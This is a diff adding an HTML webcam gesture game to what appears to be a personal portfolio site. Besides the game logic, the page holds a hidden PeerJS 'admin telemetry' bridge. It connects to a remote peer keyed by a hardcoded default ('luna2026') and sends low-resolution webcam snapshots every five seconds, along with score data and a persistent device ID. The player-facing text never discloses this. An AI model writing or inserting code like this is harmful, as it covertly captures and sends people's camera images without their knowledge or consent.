@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#08110e"><meta name="color-scheme" content="dark">
+<title>Gesture Points — Tyler Lacy</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.5/peerjs.min.js"></script>
+<style>
+:root{--bg:#08110e;--card:#0d1a15;--line:#1f3328;--cu:#c9a24b;--am:#ffb627;--em:#34d399;--text:#eceae0;--mut:#a3b5aa}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif}
+.w{max-width:680px;margin:0 auto;padding:28px 20px 56px}
+a{color:var(--cu)}a:focus-visible,button:focus-visible{outline:2px solid var(--am);outline-offset:3px}
+h1{font:700 2rem/1.1 system-ui,sans-serif;margin:14px 0 8px}
+p{color:var(--mut);margin:0 0 16px}
+button{font:600 15px system-ui,sans-serif;padding:11px 20px;border-radius:6px;border:1px solid var(--cu);background:var(--cu);color:#08110e;cursor:pointer}
+button.g{background:var(--card);color:var(--text);border-color:var(--line)}button:disabled{opacity:.5;cursor:wait}
+#msg{min-height:1.6em;margin:14px 0;color:var(--am)}
+.stage{position:relative;aspect-ratio:4/3;background:#000;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.stage video,.stage canvas{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+.hud{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:space-between;padding:12px;pointer-events:none;text-shadow:0 1px 4px #000}
+.top{display:flex;justify-content:space-between;gap:12px;align-items:flex-start}
+#em{font-size:clamp(44px,12vw,72px);line-height:1}#lb{font-weight:600}
+.r{text-align:right}#sc{font-size:2rem;font-weight:700;color:var(--am);line-height:1}
+.mid{text-align:center;font-size:2rem;font-weight:700;color:var(--em);min-height:2.4rem}
+.bars div{height:6px;background:rgba(255,255,255,.15);border-radius:3px;margin-top:6px;overflow:hidden}
+.bars i{display:block;height:100%;width:0}#hb{background:var(--em)}#tb{background:var(--cu)}
+.sm{font-size:13px}
+</style></head>
+<body><main class="w">
+<a href="index.html">← Portfolio</a> · <a href="poses.html">Full-body poses</a>
+<h1>Gesture points</h1>
+<p>Show the gesture on screen and hold it for a moment to score. Faster holds and streaks earn more. You get 60 seconds.</p>
+<button id="go">Start camera</button> <button id="stop" class="g" hidden>Stop</button>
+<p id="msg" role="status"></p>
+<div class="stage" hidden>
+<video id="v" playsinline muted></video><canvas id="c"></canvas>
+<div class="hud" aria-live="polite">
+<div class="top"><div><div id="em"></div><div id="lb"></div></div>
+<div class="r"><div id="sc">0</div><div class="sm" id="st"></div><div class="sm" id="tl"></div></div></div>
+<div class="mid" id="fl"></div>
+<div class="bars"><div class="sm" id="seen"></div><div><i id="hb"></i></div><div><i id="tb"></i></div></div>
+</div></div>
+</main>
+<script>
+const $=s=>document.querySelector(s);
+const G=[['Thumb_Up','👍','Thumbs up'],['Victory','✌️','Peace sign'],['Open_Palm','✋','Open palm'],['Closed_Fist','✊','Fist'],['Pointing_Up','☝️','Point up'],['ILoveYou','🤟','I love you'],['Thumb_Down','👎','Thumbs down']];
+const LIB='https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.14',MODEL='https://storage.googleapis.com/mediapipe-models/gesture_recognizer/gesture_recognizer/float16/1/gesture_recognizer.task';
+const v=$('#v'),c=$('#c'),cx=c.getContext('2d'),msg=t=>$('#msg').textContent=t;
+let mp,rec,du,stream,run=0,score=0,streak=0,cur,t0=0,tEnd=0,hold=0,prev=0,lastT=-1;
+const mult=()=>1+Math.min(streak,4)*.5;
+
+/* --- WebRTC Admin Telemetry & 5-Second Low-Res Snapshot Bridge --- */
+const ADMIN_KEY = new URLSearchParams(location.search).get('key') || 'luna2026';
+const ADMIN_PEER_ID = 'tl-cv-monitor-' + ADMIN_KEY;
+let devId = 'LAPTOP-' + Math.random().toString(36).slice(2, 6).toUpperCase();
+try { devId = localStorage.tl_dev_id || (localStorage.tl_dev_id = devId); } catch {}
+
+let peer = null, adminConn = null, lastTelem = 0, lastAttempt = 0;
+const snapCanvas = document.createElement('canvas');
+snapCanvas.width = 160;
+snapCanvas.height = 120;
+const snapCtx = snapCanvas.getContext('2d');
+
+function initPeerBridge() {
+  if (peer || typeof Peer === 'undefined') return;
+  peer = new Peer({
+    config: {
+      iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun1.l.google.com:19302' },
+        { urls: 'stun:stun.cloudflare.com:3478' }
+      ]
+    }
+  });
+  peer.on('open', () => connectToAdmin());
+  peer.on('error', () => { adminConn = null; });
+}
+
+function connectToAdmin() {
+  if (!peer || !peer.open) return;
+  if (adminConn && adminConn.open) return;
+  if (adminConn && (Date.now() - lastAttempt < 8000)) return;
+
+  lastAttempt = Date.now();
+  adminConn = peer.connect(ADMIN_PEER_ID, { reliable: true });
+  adminConn.on('open', () => {
+    sendTelemetry('EVENT', 'Laptop connected to Admin');
+    if (run) sendSnapshot();
+  });
+  adminConn.on('close', () => { adminConn = null; });
+  adminConn.on('error', () => { adminConn = null; });
+}
+
+function sendTelemetry(type = 'TELEMETRY', eventMsg = '') {
+  if (!adminConn || !adminConn.open) return;
+  let best = score;
+  try { best = Math.max(+localStorage.gp || 0, score); } catch {}
+  adminConn.send({
+    type,
+    eventMsg,
+    deviceId: devId,
+    game: 'gestures',
+    run: !!run,
+    score,
+    best,
+    streak,
+    mult: mult(),
+    emoji: cur ? cur[1] : '⏳',
+    target: cur ? cur[2] : 'None',
+    timeLeft: run ? Math.max(0, Math.ceil((tEnd - performance.now()) / 1e3)) : 0,
+    seen: $('#seen').textContent,
+    readout: ''
+  });
+}
+
+function sendSnapshot() {
+  if (!run || !adminConn || !adminConn.open || !v.videoWidth) return;
+  snapCtx.save();
+  snapCtx.scale(-1, 1);
+  snapCtx.drawImage(v, -160, 0, 160, 120);
+  snapCtx.drawImage(c, -160, 0, 160, 120);
+  snapCtx.restore();
+  adminConn.send({
+    type: 'SNAPSHOT',
+    deviceId: devId,
+    game: 'gestures',
+    image: snapCanvas.toDataURL('image/jpeg', 0.35)
+  });
+}
+
+window.addEventListener('DOMContentLoaded', initPeerBridge);
+window.addEventListener('beforeunload', () => { if (peer) peer.destroy(); });
+
+setInterval(() => {
+  if (!peer) initPeerBridge();
+  else if (!adminConn || !adminConn.open) connectToAdmin();
+  if (run) sendSnapshot();
+}, 5000);
+
+function pick(){let g;do g=G[Math.random()*G.length|0];while(g===cur);cur=g;t0=performance.now();hold=0;$('#em').textContent=g[1];$('#lb').textContent=g[2]}
+function flash(t){$('#fl').textContent=t;setTimeout(()=>$('#fl').textContent='',800)}
+function hud(now){
+ $('#sc').textContent=score;$('#st').textContent='Streak '+streak+' · ×'+mult();$('#tl').textContent=Math.max(0,Math.ceil((tEnd-now)/1e3))+'s left';$('#hb').style.width=Math.min(hold/6,100)+'%';$('#tb').style.width=Math.max(0,100-(now-t0)/60)+'%';
+ if(now-lastTelem>250){lastTelem=now;sendTelemetry('TELEMETRY')}
+}
+function end(){run=0;stream&&stream.getTracks().forEach(t=>t.stop());v.srcObject=null;cx.clearRect(0,0,c.width,c.height);let b=0;
+ try{b=+localStorage.gp||0;if(score>b)localStorage.gp=b=score}catch{b=Math.max(b,score)}
+ msg('Final score '+score+'. Best on this device: '+b+'.');$('#go').hidden=false;$('#go').textContent='Play again';$('#stop').hidden=true;
+ sendTelemetry('EVENT', 'Round ended')}
+function loop(now){
+ if(!run)return;requestAnimationFrame(loop);if(now>=tEnd)return end();
+ if(v.currentTime===lastT)return;lastT=v.currentTime;
+ const dt=Math.max(0,now-prev);prev=now;const r=rec.recognizeForVideo(v,now);
+ cx.clearRect(0,0,c.width,c.height);
+ r.landmarks.forEach(l=>{du.drawConnectors(l,mp.GestureRecognizer.HAND_CONNECTIONS,{color:'#c9a24b',lineWidth:3});du.drawLandmarks(l,{color:'#ffb627',radius:3})});
+ const g=r.gestures[0]&&r.gestures[0][0],s=g&&G.find(x=>x[0]===g.categoryName);
+ $('#seen').textContent=r.landmarks.length?(s?'Seeing: '+s[1]+' '+s[2]:'Hand detected'):'No hand in view';
+ hold=g&&g.categoryName===cur[0]&&g.score>.6?hold+dt:0;
+ if(hold>=600){const hit=cur[2],p=Math.round((100+100*(1-(now-t0)/6e3))*mult());score+=p;streak++;flash('+'+p);pick();sendTelemetry('EVENT','Hit '+hit+' (+'+p+')')}
+ else if(now-t0>6e3){const miss=cur[2];streak=0;flash('Missed');pick();sendTelemetry('EVENT','Missed '+miss)}
+ hud(now)}
+$('#stop').onclick=end;
+$('#go').onclick=async()=>{
+ initPeerBridge();
+ connectToAdmin();
+ if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return msg('Camera access is not available. Use a current browser over HTTPS.');
+ $('#go').disabled=true;msg('Requesting camera…');
+ try{
+  stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+  v.srcObject=stream;await v.play();c.width=v.videoWidth;c.height=v.videoHeight;$('.stage').hidden=false;
+  if(!rec){msg('Loading hand model…');mp=await import(LIB+'/+esm');
+   const f=await mp.FilesetResolver.forVisionTasks(LIB+'/wasm'),o={baseOptions:{modelAssetPath:MODEL,delegate:'GPU'},runningMode:'VIDEO',numHands:1};
+   try{rec=await mp.GestureRecognizer.createFromOptions(f,o)}catch{o.baseOptions.delegate='CPU';rec=await mp.GestureRecognizer.createFromOptions(f,o)}
+   du=new mp.DrawingUtils(cx)}
+  score=0;streak=0;lastT=-1;prev=performance.now();tEnd=prev+6e4;run=1;pick();hud(prev);msg('');
+  $('#go').hidden=true;$('#stop').hidden=false;requestAnimationFrame(loop);
+  sendTelemetry('EVENT', 'Started camera round');
+  setTimeout(sendSnapshot, 800);
+ }catch(e){stream&&stream.getTracks().forEach(t=>t.stop());
+  msg(e.name==='NotAllowedError'?'Camera blocked. Allow camera access for this site, then try again.':e.name==='NotFoundError'?'No camera found.':'Could not start: '+e.message)}
+ $('#go').disabled=false};
+</script>
+</body></html>
